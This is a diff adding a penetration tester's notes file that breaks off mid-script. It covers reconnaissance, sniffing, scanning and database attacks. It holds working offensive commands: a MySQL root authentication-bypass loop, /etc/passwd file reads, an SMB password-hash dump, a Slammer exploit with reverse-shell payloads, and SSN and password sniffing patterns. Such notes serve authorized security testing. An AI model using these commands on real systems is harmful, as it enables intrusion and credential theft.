@@ -1,0 +1,4272 @@
+
+OSSTMM - Open Source Security Testing Methodology Manual - www.isecom.org/osstmm
+
+NIST - Guideline on Network Security Testing
+	 http://csrc.nist.gov/publications/nistpubs/800-42/NIST-SP800-42.pd
+	New Guideline - 800-53A - 
+
+OWASP - http://www.owasp.org/index.php/OWASP_Testing_Guide_v2_Table_of_Contents
+
+Penetration Testing Framework - very deep, with specific tools and commands
+	http://www.vulnerabilityassessment.co.uk/Pentration%20Test.html
+
+exploit-db.org	- exploit site like milworm
+
+Pentest Internal Permission Memo - 
+	http://www.counterhack.net/permission_memo.html
+	Not suitable if you want to perform a 3rd party pen test
+
+VOIP Ware Dialer
+	warvox.org
+
+********************************************************************************************************
+Reporting
+********************************************************************************************************
+
+Reporting Pieces:
+	Executive Summary - keep it short 1-1.5 pages
+		Findings
+			Criticial findings are a must
+			Determine the root cause of findings and outline here
+			In a web app pen test, these root causes often involve
+				required changes to the web app development \
+				process
+		Recommendations
+			Reasonable and sccomplishable goals
+			Overarching solutions if possible
+			Recomended timeframes - short term fixes vs. long-term 
+				changes
+	Introduction
+		Explain the scope
+			Include any restrictions or special requests
+		Define the objective of the test
+			For example, if the application owner was only 
+				interested in security of the authentication 
+				system, say so
+		List the team with contact information
+			List both testing personnel and points of contact 
+				within the target organization
+		Typically this section is 1-2 pages in length
+	Methodology
+		Step-by-step, including the tools used at each step
+		Customize for the specific test and its findings
+		Your goal should be enough depth so that a pen tester could 
+			verify and repeat your work
+		This section often runs 3-10 pages in length
+	Findings
+		This section contains the meat of the report
+		Each finding is listed and categorized according to risk
+			High/Medium/low risk, as well as notes
+			Indicate the likelyhood that a given flaw can/will be 
+				exploited
+		Sometimes the findings need to be divided by application
+		Recommendations are part of the findings
+			You may have multiple methods for dealing with a given 
+				finding
+			List each one of them, and identify which one is most 
+				beneficial for the target organization and why
+	Conclusions
+		Very short section similar to the executive summary
+		Reiterates the executive summary...but from a perspective of 
+			answering the technicians who will fix the issues
+		Any Appendixes are added after the conclusion...including:
+			Permission memo(s)
+			Lists of users harvested
+			Records retrieved from the database
+			Detailed tool output
+			List of IP's/Servers at risk
+
+Reporting Tools:
+	CAL9000 from OWASP - Tool focused on data collection
+	FreeMind and MindMapper -tools for mindmapping
+	The OWASP Report Generator -tool for Report Generation
+
+********************************************************************************************************
+Reconaissance
+********************************************************************************************************
+
+bugmenot  - http://www.bugmenot.com/view/pearsonsuccessnet.com
+	  shows logins and passwords for web sites.  Great for recon.
+
+recon-ng - metasploit like interface for getting recon information.  Ties into linkedin, google, etc.
+
+HTTrack - automates the collection of HTTP links to and from the target site and then 
+	applies a simple statistical weighing algorithm to deduce which web sites have
+	the strongest "relationships" with the target site
+	slapt-get --install httrack
+	 
+
+NetCraft - search dns on http://searchdns.netcraft.com/?host
+	site contains:  *mysite*
+			*myothersite*
+	uptime.netcraft.com
+
+Host
+	Attempt a dns zone trasfer by performing the following:
+		host -l mysite.com
+			;Transfer failed.
+		host -l mysite.com grover.mysite.com
+
+		host -a mysite.com
+			;;QUESTION SECTION:
+			;mysite.com
+		
+			;;ANSWER SECTION:
+			mysite.com.	40278	IN	MX	5 asmtpgw2u.mysite.com
+			mysite.com.	40278	IN	MX	10 asmtpgwu.mysite.com
+			mysite.com	40278	IN	NS	grover.mysite.com
+			mysite.com	40278	IN	NS	gonzo.mysite.com
+	
+			;;ADDITIONAL SECTION:
+			grover.mysite.com	84567	IN	A	192.208.27.1
+			gonzo.mysite.com	75177	IN	A	192.208.27.2
+
+		host -t mx mysite.com
+			mysite.com mail is handled by 10 asmtpgwu.mysite.com
+			mysite.com mail is handled by 5 asmtpgw2u.mysite.com
+
+		host -t ns mysite.com
+			mysite.com name server gonzo.mysite.com
+			mysite.com name server grover.mysite.com
+
+dnsenum.pl - enumerates DNS information:
+	cd /pentest/enumeration/dnsenum/
+	perl ./dnsenum.pl <domain name> ./dns.txt
+	perl ./dnsenum.pl sans.org ./dns.txt
+
+SMTP mail bounce 
+	Send a normal e-mail to an address within the target domain that you assume doesn't 
+	exist.  The hope is that the message will find its way to the actual mail server 
+	responsible for that domain, where it will be rejected and sent back to us, all the
+	while recording the host names and IP addresses of the servers that handle it.	
+
+whois	check out the range of IP's returned from the whois commands:
+	whois 192.208.27.1
+	whois www.mysite.com
+	whois mysite.com
+	whois records contain:
+		e-mail addresses
+		Phone numbers
+		Names of technical and management staff
+		Authoritative name servers - which may contain other domains related to the 
+			target
+
+dig 	lookup info
+	dig www.mysite.com
+		192.208.27.6
+	dig @ns1.giac.org -t ANY sans.org
+		dig AXFR sans.org	-Performs a zone transfer
+		-t MX for mail servers
+		-t AXFR for a zone transfer
+		-t ANY for any records
+	dig @4.2.2.2 site.com -t AXFR	-Performs a zone transfer
+
+nslookup	nslookup [host] [dns server]
+	server <server you want to do a transfer on>
+	set debug	-instructs nslookup to return more information
+	ls -d domain.com > domain.txt
+	
+
+WHOIS Proxies - Visit sites to get whois information:
+	dnsstuff.com
+	www.samspade.org
+	www.geektools.com
+	www.whois.net
+	ws.arin.net/whois
+		enter in IP and get details of the registered owner
+		enter in the name of the organization and get a list of IP ranges
+
+Use ipcalc to assist with determining IP ranges returned from whois searches:
+	ipcalc 192.208.16.0/21
+	Address:   192.208.16.0         11000000.11010000.00010 000.00000000
+	Netmask:   255.255.248.0 = 21   11111111.11111111.11111 000.00000000
+	Wildcard:  0.0.7.255            00000000.00000000.00000 111.11111111
+	=>
+	Network:   192.208.16.0/21      11000000.11010000.00010 000.00000000
+	HostMin:   192.208.16.1         11000000.11010000.00010 000.00000001	
+	HostMax:   192.208.23.254       11000000.11010000.00010 111.11111110
+	Broadcast: 192.208.23.255       11000000.11010000.00010 111.11111111
+	Hosts/Net: 2046                  Class C
+
+	ipcalc 192.208.24.0/22
+	Address:   192.208.24.0         11000000.11010000.000110 00.00000000
+	Netmask:   255.255.252.0 = 22   11111111.11111111.111111 00.00000000
+	Wildcard:  0.0.3.255            00000000.00000000.000000 11.11111111	
+	=>
+	Network:   192.208.24.0/22      11000000.11010000.000110 00.00000000
+	HostMin:   192.208.24.1         11000000.11010000.000110 00.00000001
+	HostMax:   192.208.27.254       11000000.11010000.000110 11.11111110
+	Broadcast: 192.208.27.255       11000000.11010000.000110 11.11111111	
+	Hosts/Net: 1022                  Class C
+
+
+DNS Reverse Walker - nmap can be used to perform a DNS reverse walk of a given IP range:
+	nmap -sL 192.208.27.1-255
+		Starting Nmap 4.50 ( http://insecure.org ) at 2008-05-20 21:08 MDT
+		Host grover.mysite.com (192.208.27.1) not scanned
+		Host gonzo.mysite.com (192.208.27.2) not scanned
+		Host smtpgwu.mysite.com (192.208.27.3) not scanned
+		Host ftpwapa.mysite.com (192.208.27.4) not scanned
+		Host asmtpgw2u.mysite.com (192.208.27.5) not scanned
+		Host www.mysite.com (192.208.27.6) not scanned
+		Host user27-007.mysite.com (192.208.27.7) not scanned
+		Host www.eptc.mysite.com (192.208.27.8) not scanned
+		Host www.es.mysite.com (192.208.27.9) not scanned
+		Host www.myothersite.org (192.208.27.10) not scanned
+		Host rasw1.mysite.com (192.208.27.11) not scanned
+		Host rasw2.mysite.com (192.208.27.12) not scanned
+		Host user27-013.mysite.com (192.208.27.13) not scanned
+		Host ra1.mysite.com (192.208.27.14) not scanned
+		Host user27-015.mysite.com (192.208.27.15) not scanned
+		Host www.es.mysite.com (192.208.27.16) not scanned
+		.
+		.
+		Host ra2.mysite.com (192.208.27.23) not scanned
+		Host bes.mysite.com (192.208.27.24) not scanned
+		.
+		.
+		Host user27-254.mysite.com (192.208.27.254) not scanned
+		Host 192.208.27.255 not scanned
+		Nmap done: 255 IP addresses (0 hosts up) scanned in 14.532 seconds
+
+fierce domain scanner
+		http://ha.ckers.org/fierce
+		Lookup hosts
+		   perl fierce.pl -dns sec542.org
+		Scan an IP range
+		   perl fierce.pl -range 127.0.0.0-255 -dnsserver ns1.sec542.org
+		Perfrom reverse lookups after finding CNAMEs
+		   perl fierce.pl -dns sec542.org -wide -
+		Perfrom an actionafter connecting to Port 80
+		   perl fierce.pl -dns sec542.org -connect headers.txt -fulloutput
+		Dictionary attack to find hosts
+		   perl fierce.pl -dns sec542.org -wordlist dictionary.txt 
+
+	
+HOST DISCOVERY
+nmap
+	  -sS  -TCP SYN Stealth Scan
+	  -sP  -Ping Sweep - go no further than determing if host is online.
+	  -sV  -Version Probing
+	  -O  -OS Detection
+	  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
+	  -PS/PA/PU [portlist]: TCP SYN/ACK or UDP discovery to given ports
+
+	nmap -sP -PP -PM -PE -PS7,9,11,13,19,21,22,23,37,42,49,53,65,66,67,69,79,80,88,98,108,109,110,111,113,115,118,119,123,135,137,139,143,150,161,162,175,177,179,256,257,258,264,265,353,389,396,400,405,407,443,445,464,469,500,512,513,514,515,517,518,520,523,524,540,543,544,548,593,628,631,636,749,750,751,761,783,901,902,903,904,993,1024,1030,1040,1045,1080,1109,1352,1416,1417,1418,1419,1420,1433,1434,1461,1483,1494,1502,1512,1520,1521,1522,1523,1524,1525,1526,1527,1528,1529,1530,1549,1645,1651,1701,1723,1812,1813,1900,1959,1984,2001,2005,2009,2034,2036,2037,2049,2065,2200,2433,2998,3000,3128,3264,3306,3372,3389,4000,4001,4045,4100,4333,4827,5000,5400,5405,5432,5631,5632,5800,5801,5802,5803,5900,5901,5902,5903,6000,6001,6002,6003,6004,6005,6006,6007,6008,6009,6050,6101,6129,6667,6699,7070,7100,7650,7651,8008,8009,8080,8081,8082,8443,8888,9001,9090,9100,9111,16959,26000,27374,27444,27665,31335,31337,32770,32771,32772,32773,32774,32775,32776,32777,32778,32779,32780,29213,45000,49400,54320,54321,65301 192.208.27.1-255 
+
+	When logged in as root and it doesn't find any open ports try:
+		nmap -sT -P0 -p1-65535 192.168.0.106 -T4
+
+
+netdiscover	-discovers hosts via arp requests
+	http://nixgeneration.com/~jaime/netdiscover/
+	Usage: netdiscover [-i device] [-r range | -p] [-s time] [-n node] [-c count] [-f] [-S]
+	  -i device: your network device
+	  -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8
+	  -p passive mode do not send anything, only sniff
+	  -s time: time to sleep between each arp request (miliseconds)
+	  -c count: number of times to send each arp reques (for nets with packet loss)
+	  -n node: last ip octet used for scanning (from 2 to 253)
+	  -S enable sleep time supression betwen each request (hardcore mode)
+	  -f enable fastmode scan, saves a lot of time, recommended for auto
+
+	  If -p or -r arent enabled, netdiscover will scan for common lan addresses
+
+Network Discovery
+    CentralOps.net; DigitalPoint.com - attack from 3rd party location
+    DomainTools.com
+    Paterva.com
+
+Maltego		-information mapping tool that finds the relationships between
+		people, sites and companies.  Very Cool Tool!
+		http://www.paterva.com/maltego/
+
+Social Networking sites:
+	linkedIn
+	Orkut
+	MySpace
+	Facebook	
+	Twitter
+
+Yahoo people search: http://people.yahoo.com
+
+Google Profile Search:
+	http://www.google.com/profiles?q=
+
+Google phone book:
+	phonebook:[name] [state]
+
+
+Whois Searches:
+	www.samspade.org
+	www.geektools.com
+	www.whois.net
+
+http://www.arin.net/whois	#searches using the folloing:
+	n: network address space
+	a: autonomous system		#BGP router 
+	p: point of contact
+	o: organization
+	@ [domain name]: match e-mail address
+
+BiLE - Bi-directional Link Extractor - finds additional targets through web
+	crawling, DNS Lookups and Google searches
+	./BilE [target] [results_file]
+	./BiLE-weigh.pl [site_of_interest] [BiLE_output.mine]
+
+	tld-expand.pl	takes a list of domain names and appends over 250 Top-Level-
+		Domain suffixes to them, looking them up in DNS to determine
+		if they are valid
+
+	vet-IPrange.pl	script then looks up all the domain names discovered by BiLE,
+		ranked by BiLE-weigh, and identified by exp-tld, and looks up
+		their IP addresses
+
+	vet-mx.pl 	looks up the Mail eXchange (MX) record for each domain name 
+		listed in a file
+
+	qtrace.pl	script uses Hping to traceroute to all target IP addresses 
+		listed in a file, such as the output of vet-IPranage.pl
+
+	BiLE -> BiLE-weigh -> exp-tld -> vet-Iprange & vet-mx -> qtrace
+
+
+Jarf-rev and Jarf-dnsbrute are helpful in getting information from DNS even 
+	when zone transfers are blocked
+
+lft	Layer Four Traceroute
+	http://pwhois.org/lft
+
+
+********************************************************************************************************
+Passive Reconnaissance
+********************************************************************************************************
+
+tcpdump		-passive sniffer
+	tcpdump -nn -vvv -s 1500 -X -w capture.cap
+		-nn		Don't resolve dns name or port name
+		-vvv		verbose - full protocol decode
+		-s 1500	Snarf x bytes of data. Window size?
+		-X		print headers, hex and ascii
+		-w capture.cap	write to file capture.cap
+
+	tcpdump -i eth1 tcp dst port 80 and src host 192.168.0.10
+
+	tcpdump -nn -r perimeter_class.cap src net 12.33 and src port 80 and not src port 
+	443 and not src host 12.33.247.2
+
+	tcpdump		-recompile with decrypt option.  Can be used to decrypt IPSec traffic
+
+	tcpdump portrange [start-end]
+
+urlsnarf	sniff HTTP requests
+mailsnarf	sniffs mail from SMTP and POP traffic
+dsniff		sniffs passwords 
+
+ssldump	-sniff and decode SSL sessions.  If you have the server private key you can
+	 do man in the middle.
+	ssldump -AdN tcp port 443
+		-A	print all record fields
+		-d	decode the application layer
+		-r	read input from a libpcap file
+		-k	the name of the file which contains the servers private key
+		-p	passphrase used to secure the private key
+		-N	print out the servers digital certificate
+
+ngrep 		similar to grep but works on packets
+	ngrep -i 'sring to search for'		Sniffs the wire just like tcpdump
+	Excellent primer to get started: www.stearns.org/doc/ngrep-intro.current.html
+	ngrep port 23
+	ngrep -wi 'user|pass' tcp port 110
+	ngrep -i 'rcpt to|mail from' tcp port 25
+	ngrep [0-9][0-9][0-9]\-[0-9][0-9]\-[0-9][0-9][0-9][0-9]  Sniff for SSN 123-12-1234
+	ngrep [0-9]{3}\-?[0-9]{2}\-?[0-9]{4}	Sniff for SSN above or 123121234
+		-F <file>	load a filter file (like tcpdump)
+		-i		case insensitive
+		-I <file>	Read libpcap file
+		-n <number>	Find <number> packets that match filter
+		-O <file>	Output to file in libpcap format
+		-q		quiet output. Do not print # every time a packet is 
+				checked
+		-v		inverse match, just like grep
+		-w		Match regex as whole word
+		-x		print Hex as well as ASCII
+		-X		match as Hex rather than ASCII
+
+
+Wireshark	sniffer includes several other tools in the install dir:
+		capinfos		-shows information about capture files
+						capinfos file.cap
+		dumpcap			-similar to tcpdump but includes flexible
+						 capture options. i.e. files size, number 
+						 of packets, multiple files, etc.
+		editcap			-convert capture files between different
+						 formats
+		mergecap		-Merge 2 or more capture files
+						 extract packets based on timestamp
+		rawshark
+		text2pcap
+		tshark 			-text interface for wireshark (like tcpdump)
+						tshark -r file.cap 
+						tshark -V -r file.cap
+
+	Import SSL Private key into wireshark to have it decrypt traffic for analysis:
+		Edit
+		Preferences
+		Click on Protocols
+		Scroll down to SSL
+		In the field titled "RSA keys list" type the following:
+			<server IP>,443,http,</path to key i.e. server.pem>
+		Now look at the "Uncompressed entity body" tab at the bottom of Wireshark
+
+	Wireshark filtering:
+		tcp.port==53
+		ip.addr==10.2.52.1
+		DNS
+		SMTP
+		HTTP
+		(tcp.port==5800) or (tcp.port==5900) or ((tcp.port==80) && (ip.addr=10.1.1.1))
+		http.content_type contains.gif
+		http.content_type contains "image"
+		http.content_length > 10000		-any file downloaded larger than 10,000 bytes
+		http.response.code == 404
+		http.user_agent
+		http.request.rui
+
+ASS	Autonomous System Scanner, or ASS is a tool that performs both active and passive collecting
+	of routing protocol information.
+	ass -vv -i eth1 -A
+		i <interface> interface
+		-v verbose
+		-A this sets the scanner into active mode
+		-P <protocols> see above (usage: -P EIR12)
+		-M EIGRP systems are scanned using the multicast
+		   address and not by HELLO enumeration and direct query
+		-a <autonomous system> autonomous system to start from
+		-b <autonomous system> autonomous system to stop with
+		-S <spoofed source IP> maybe you need this
+		-D <destination IP> If you don?t specify this, the appropriate
+		   address per protocol is used
+		-p don?t run in promiscuous mode (bad idea)
+		-c terminate after scanning. This is not recommened since answers 
+		   may arrive later and you could see some traffic that did not show
+		   up during your scans
+		-T <packets per delay> packets how many packets should we wait some
+		   miliseconds (-T 1 is the slowest scan	-T 100 begins to become unreliable)
+
+Passive OS Fingerprinting - used in a 'sniffer' mode for OS detection.  Not very precise but good 
+	when you can't do a full out scan.  A pen test can interact with the target web server by 
+	browsing the web site while P0F is running:
+		p0f -i eth1
+	
+
+
+Driftnet	-listens to network traffic and picks out images from TCP streams it observes.
+		/usr/bin/driftnet - requires X I believe
+		/usr/bin/drifnet -v -I eth1
+
+********************************************************************************************************
+Enumeration and Scanning / Banner Grabbing and Fingerprinting
+********************************************************************************************************
+
+Banners and Web sites
+	Use net cat to examine the service banners for mail servers, FTP servers and web
+	servers:
+		nc -v 192.208.27.4 21
+
+Banner Grabbing with nmap
+	nmap -T4 -sS -A -v -p1-65535 192.208.27.1-255
+		-T4 	-aggressive scan 0-4, 0 being paranoid
+		-sS	-SYN-based scan
+		-A	-perform -sV version scan, -O OS Fingerprinting and script scans
+		-v	-verbose output
+		-p1	-ports to scan
+		scripts are in /usr/share/nmap/scripts
+			robots.nse
+
+nmap	nmap -n -sP -D ip1,ip2,ip3 -oN ping.txt 5.6.7.8
+	nmap -n -sT -p1-65535 --packet_trace 192.168.1.1
+	nmap -n -P0 -sS -p1-65535 -D 192.168.1.10,192.168.1.11, \
+		192.168.1.12 192.168.1.1	Spoof ip address
+	nmap -sS -n -v -p 100 -P0 www.fubar.com
+	nmap -sA -n -v -p 100 -P0 www.fubar.com				
+	nmap -sT -n -v -p 80 -P0 192.168.1.0/24
+
+	When logged in as ROOT root and it doesn't find any open ports try:
+		nmap -sT -P0 -p1-65535 192.168.0.106 -T4
+
+	nmap -sS -sV -O 10.1.1.1
+	  -sS  -TCP SYN Stealth Scan
+	  -sP  -Ping Sweep - go no further than determing if host is online.
+	  -sV  -Version Probing
+	  -O  -OS Detection
+	  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
+	  -PS/PA/PU [portlist]: TCP SYN/ACK or UDP discovery to given ports
+	
+	UDP port scanning is unreliable and takes forever.  Scan UDP ports that are
+	easily exploitable:
+	nmap -sU -T4 -p 69,123,161,1985 192.168.0.254
+		-UDP port 69   tftp
+		-UDP port 123  ntp
+		-UDP port 161  snmp
+		-UDP port 1985 hsrp	
+
+
+	--packet-trace		displays a summary of packets that it sends
+				in real time
+				p -turns on packet tracing in the middle of a 
+				scan; shift p will turn it off
+	--host_timeout		max time spent on a single host before moving
+				on; default is no host_timeout
+	--max_parallelism	sets the number of probes nmap will send in 
+				parallel (1=serial)
+	--scan_delay		sets minimum time nmap waits between sending
+				probe packets.
+	--scanflags [URG|ACK|PSH|RST|SYN|FIN|ECE|CWR|ALL|NONE]
+		nmap --scanflags SYNURGACK -p 139 10.10.10.10
+	-sU			5.2 and later sends spicific payaloads for 12 
+				known UDP services, SNMP, NTP, DNS, etc
+	--badsum		generate a packet with invalid TCP or UDP
+				checksum
+
+	NSE			Nessus Scripting Engine
+				uses Lua programming language www.lua.org
+					Lua is used in Snort, Nmap and Wireshk	
+	-sC			run script	
+	--script=[all,category,dir,script...] [targets] -p [ports]
+		Categories:
+			Safe
+			Intrusive
+			Auth
+			Malware
+			Version
+			Discovery
+			Vuln
+			External
+			Default
+
+		ls /usr/share/namp/scripts/ - lists all scripts
+		/usr/share/namp/scripts/script.db  - shows all scripts
+
+		nmap -n -sV --script=sshv1.nse --script-trace 1.1.1.1 -p 22
+			run script sshv1.nse, display the trace of scan 
+			activity against 1.1.1.1 on port 22
+
+		nmap -n -sV --script=nbstat.nse 1.1.1.1
+			same as nbtstat -A on windows
+ 	
+		nmap -n -sV --script=robots.txt.nse 1.1.1.1 -p 80
+			gets robots.txt files from web servers
+
+		namp -n -sV --script=all 1.1.1.1
+
+		Dump password hashes off of windows box:
+		nmap  --script=smb-pwdump --script-args=smbuser=jimmy,smbpass=password 1.1.1.1 -p139,445
+			svn co -r12061 svn://svn.insecure.org/nmap-exp/ron/nmap-smb		#to get smb-pwdump
+
+
+tcptraceroute
+	tcptraceroute -n www.site.com 80
+	-performs a tcp traceroute to the site and port you specify
+
+
+Dr. Morena		www.securiteam.com/tools/5MP0P1F40Y.html 	- map firewalls
+FTester			dev.inversepath.com/trac/ftester		- map firewalls
+
+
+httprint - fingerprints http servers
+	http://www.net-square.com/httprint/
+		Can be run in Wine under Linux
+		Output can be viewed in firefox in the httprintoutput.html file
+	httprint -h 192.208.27.4 -s /pentest/web/httprint/signatures.txt
+		httprint v0.301 (beta) - web server fingerprinting tool
+		(c) 2003-2005 net-square solutions pvt. ltd. - see readme.txt
+		http://net-square.com/httprint/
+		httprint@net-square.com
+
+		Finger Printing on http://192.208.27.4:80/
+		Finger Printing Completed on http://192.208.27.4:80/
+		--------------------------------------------------	
+		Host: 192.208.27.4
+		Derived Signature:
+
+		811C9DC5E2CE6922811C9DC5811C9DC5811C9DC5811C9DC5811C9DC5811C9DC5
+		811C9DC5970EE6BB811C9DC5811C9DC5811C9DC5811C9DC5811C9DC5811C9DC5		
+		E2CE6922E2CE6922E2CE6922811C9DC5E2CE6922811C9DC5E2CE6922811C9DC5
+		E2CE6922E2CE6922811C9DC5E2CE6922E2CE6922
+
+		Banner Reported: -
+		Banner Deduced: Linksys BEFSR41/BEFSR11/BEFSRU31
+		Score: 65
+		Confidence: 39.16		
+		------------------------
+		Scores:
+		Linksys BEFSR41/BEFSR11/BEFSRU31: 65 39.16
+		Ubicom/1.1: 56 24.51
+		Ubicom/1.1 802.11b: 56 24.51
+		MailEnable-HTTP/5.0: 55 23.15
+		Linksys AP1: 54 21.85	
+		Linksys Router: 52 19.39
+		Cisco-HTTP: 46 13.12
+		Cisco Pix 6.2: 46 13.12
+		Snap Appliances, Inc./3.x: 45 12.23
+		NetBuilderHTTPDv0.1: 43 10.57
+
+ike-scan - helps finger print VPN implementations
+	ike-scan 192.208.27.14
+	ike-scan -M 192.208.27.14
+		Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+		65.208.204.146  Main Mode Handshake returned
+		        HDR=(CKY-R=ab6f7639cfedcb15)
+		        SA=(Enc=3DES Hash=SHA1 Auth=PSK Group=1:modp768 LifeType=Seconds LifeDuration(4)=0x00007080)
+
+		Ending ike-scan 1.9: 1 hosts scanned in 0.275 seconds (3.64 hosts/sec).  1 returned handshake; 
+		0 returned notify
+	ike-scan -A --id=test 192.208.27.14
+
+amap - Application version detection
+	amap -W		Update the application fingerprint database
+	amap -Abqu 192.208.27.4 1-65535
+		-A 	Map applications
+		-b 	print any ASCII banner received
+		-q	do no mark closed an nonresponsive ports as identified or reported
+		-u	and use UDP ports
+		1-65535	ports 1-65535
+
+SMB / NetBios
+	aquire nbtscan from http://www.unixwiz.net/tools/nbtscan.html
+		nbtscan -fv 192.208.27.0/24
+
+	smb4k
+
+LdapMiner	collects information from LDAP servers
+		http://sourceforge.net/projects/ldapminer/
+		./LdapMiner -h 192.208.27.10 -d 
+			-h 	host 
+			-d	dump all data you can grab using null account
+		./LdapMiner -h 192.208.27.10 -B jimmy -w Pa$$w0rd -d
+			-p	port
+			-h 	host
+			-B	user
+			-w	password for above user
+			-d	dump all data you can grab using jimmy account
+
+ldapsearch	search ldap server, including Microsoft:
+		ldapsearch -h 10.1.1.1 -p 636 -D “dc=jimmy,dc=com”
+
+BiDiBLAH	Automates attack tasks 
+			Ports scanners -> Banners -> targeting -> Nessus ->
+				Metasploit -> Reporting
+
+
+OpenVAS		Fork of Nessus 2.2 scanner
+		http://www.openvas.org/
+
+Netviewx and nbenum
+Cheops-ng	Map network, OS detection, banner grabbing
+	http://cheops-ng.sourceforge.net
+Lumeta IP Sonar
+
+Network Discovery
+    CentralOps.net; DigitalPoint.com - attack from 3rd party location
+;    DomainTools.com
+    Paterva.com
+
+********************************************************************************************************
+Databases 
+********************************************************************************************************
+
+Gain Root on older versions of MySQL:
+	versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 are vulnerable.
+	for i in `seq 1 1000`; do mysql -u root --password=bad -h 127.0.0.1 2>/dev/null; done
+
+
+Ports
+	MS SQL - TCP 1433
+		 UDP 1434
+		nmap -sP -p 1433 x.x.x.x/x
+		nmap -sU -p 1434 x.x.x.x/x
+	Oracle - TCP 1521
+		nmap -sP -p 1521 x.x.x.x/x
+
+Sites with good DB Pen Testing Tools:
+	Oracle	- www.petefinnigan.com/index.htm
+	MS SQL  - www.sqlsecurity.com
+
+*********************
+MySQL
+*********************		
+
+View contents of a file in MySQL:
+SELECT LOAD_FILE('/etc/passwd') AS Result;
+ +---------------------------------------+
+ | Result                                |
+ +---------------------------------------+
+ | root...blablabla			 |
+ +---------------------------------------+
+
+
+*********************
+Postgres
+*********************
+
+psql to access postgres DB
+psql -U user
+
+\list to list the databases
+\c [DATABASE] to select the database [DATABASE]
+\d to list the tables
+
+select * from users;
+
+
+Read files:
+ CREATE TABLE demo(t text);
+ COPY demo from '/etc/passwd';
+ SELECT * FROM demo;
+
+
+*********************
+MS SQL
+*********************
+SQL Server Versions:
+	SQL Server 7.0 RTM  	7.00.623
+	SQL Server 7.0 SP1	7.00.699
+	SQL Server 7.0 SP2	7.00.842	
+	SQL Server 7.0 SP3	7.00.961
+	SQL Server 7.0 SP4	7.00.1063	
+
+	SQL Server 2000 RTM	2000.80.194.0	use metasploit- exploit:  windows/mssql/ms02_039_slammer
+								payload:  win32_reverse 
+									windows/shell/reverse_http             
+									windows/shell/reverse_ord_tcp       
+									windows/shell/reverse_tcp           
+									windows/shell_bind_tcp              
+									windows/shell_reverse_tcp           
+	SQL Server 2000 SP1	2000.80.384.0
+	SQL Server 2000 SP2	2000.80.534.0
+	SQL Server 2000 SP3	2000.80.760.0
+	SQL Server 2000 SP3a	2000.80.760.0
+	SQL Server 2000 SP4	2000.8.00.2039
+
+	SQL Server 2005 RTM	2005.90.1399
+	SQL Server 2005 SP1	2005.90.2047
+	SQL Server 2005 SP2	2005.90.3042
+
+SQLAT - SQL Server Auditing Tools
+	To install the tools create a script called installscript.pl with the following and run it:
+								                  			                         PATH93="http://www.hacktoolrepository.com/files/Libraries/FreeTDS%20version%200.62.4/freetds-0.62.4.tar.gz"
+	FILE93="freetds-0.62.4.tar.gz"
+	DIR93="freetds-0.62.4"
+	PROG93="freetds"
+
+PATH62="http://www.hacktoolrepository.com/files/Database/SQL%20Auditing%20Tools/sqlat-src-1.1.0.tar.gz"
+	FILE62="sqlat-src-1.1.0.tar.gz"
+	DIR62="sqlat-src-1.1.0"
+	PROG62="sqlat"
+
+	#The directory where the source can be downloaded and build
+	SRCDIR='/usr/local/src/SQL_Auditing_Tools'
+	#The directory where the software should be installed
+	TRGDIR='/usr/local'
+	REDOWNLOAD='no' #Remove downloaded files and download again	
+	#Variables will be discovered with which. Only change when prompted by the install script
+	DOWNLOAD=''
+	AWK=''
+	SED=''
+	#=========================================================================================
+	# Don't change anything past here
+
+	if [ -f /etc/redhat-release ]; then
+	  MANPATH='/usr/local/share/man' # for hping
+	fi
+	if [ -z "$1" ]; then
+	  echo usage $0 username
+	  echo username is the person you normally log on with that will configure and make the program
+	  exit
+	fi
+	#The download program to use (i.e. lwp-dowload or wget including full path and options)
+	if [ -d ${DOWNLOAD} ]; then
+	  DOWNLOAD=`which wget`
+	fi
+	if [ -z ${DOWNLOAD} ]; then
+	  DOWNLOAD=`which lwp-download`
+	  if [ -z ${DOWNLOAD} ]; then
+	    echo Could not find wget or lwp-download to download files. Please set the variable download at the top of the script.
+	    exit 3
+	  fi
+	else
+	  TEMPDOWN="${DOWNLOAD} -nc --user=ftp --password=ftp -t 2"
+	  DOWNLOAD=${TEMPDOWN}
+	fi
+	if [ -z ${SED} ]; then
+	  SED=`which sed`
+	fi
+	if [ -z ${SED} ]; then
+	  echo Could not find sed program. Please set variable sed at the top of the script.
+	  exit 4
+	fi
+	if [ -z ${AWK} ]; then
+	  AWK=`which awk`
+	fi
+	if [ -z ${AWK} ]; then
+	  echo Could not find awk program. Please set variable AWK at the top of the script.
+	  exit 5
+	fi
+	# Ran by superuser?
+	eval `/usr/bin/id | ${SED} 's/[^a-z0-9=].*//'`
+	if [ "${uid:=0}" -ne 0 ]
+	then
+	  echo $0: You must be root to run $0
+	  exit 2
+	fi
+	SCRIPTPATH=`pwd`
+	USER=$1
+	export SRCDIR TRGDIR USER DOWNLOAD SED AWK SCRIPTPATH REDOWNLOAD
+	export PATH93 FILE93 DIR93
+	export PATH62 FILE62 DIR62
+	umask 022
+	mkdir -p ${SRCDIR}
+	chown ${USER} ${SRCDIR}
+	cd ${SRCDIR}
+	rm -fr ${SRCDIR}/${DIR93}
+	su ${USER} -c '
+	  cd ${SRCDIR}
+	  if [ ! -f ${FILE93} ]; then
+	    echo retrieving freetds-0.62.4.tar.gz
+	    ${DOWNLOAD} ${PATH93}
+	  fi;
+	  tar -xzvf ${FILE93}
+	  cd ${SRCDIR}/${DIR93}
+	  ./configure --prefix=${TRGDIR}
+	  make
+	'
+	cd ${SRCDIR}/${DIR93}
+	make install
+	ldconfig
+	cd ${SRCDIR}
+	rm -fr ${SRCDIR}/${DIR62}
+	su ${USER} -c '
+	  cd ${SRCDIR}
+	  if [ ! -f ${FILE62} ]; then
+	    echo retrieving sqlat-src-1.1.0.tar.gz
+	    ${DOWNLOAD} ${PATH62}
+	  fi;
+	  tar -xzvf ${FILE62}
+	  export DIR62=$(echo ${DIR62} | sed "s/src-//g")
+	  cd ${SRCDIR}/${DIR62}
+	  ./configure --prefix=${TRGDIR} --with-freetds=${TRGDIR}
+	  make
+	'
+	cd ${SRCDIR}/${DIR62}
+	export DIR62=$(echo ${DIR62} | sed "s/src-//g") && cd ${DIR62} && cp bin/* ${TRGDIR}/bin/
+	echo '#########################################################'
+	echo '#                                                       #'
+	echo '#               Done installing SQL Auditing Tools'
